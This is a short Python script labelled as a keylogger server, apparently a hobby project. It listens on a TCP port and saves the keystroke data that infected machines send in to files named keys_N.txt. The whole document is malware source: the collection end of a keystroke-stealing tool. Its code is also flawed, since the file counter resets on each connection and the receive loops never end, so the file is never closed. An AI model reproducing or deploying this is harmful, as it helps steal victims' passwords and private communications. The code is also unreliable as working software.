''''
Keylooger Server
Author: Thiago Ferrari
Version: 1.0
'''

import socket
import sys

#change the IP address

s = socket.socket()
s.bind(("1.1.1.0",9999))
s.listen(10)

while True:
    sc, address = s.accept()

    print (address)
    i=1
    f = open('keys_'+ str(i)+".txt",'wb')
    i=i+1
    while (True):
        l = sc.recv(1024)
        while (l):
                f.write(l)
                l = sc.recv(1024)
    f.close()


    sc.close()

s.close()
